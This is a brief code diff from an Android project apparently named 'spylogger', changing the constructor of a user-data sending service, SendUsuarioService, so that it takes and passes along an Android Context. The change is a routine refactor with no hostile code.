@@ -1,5 +1,7 @@
 package com.gravatasufoca.spylogger.services;
 
+import android.content.Context;
+
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.vos.UsuarioVO;
 
@@ -11,8 +13,8 @@ import retrofit2.Call;
 
 public class SendUsuarioService extends SendDataService<UsuarioVO> {
 
-    public SendUsuarioService(TaskComplete handler) {
-        super(handler);
+    public SendUsuarioService(Context context,TaskComplete handler) {
+        super(context,handler);
     }
 
     public void inserirUsuario(UsuarioVO usuarioVO){
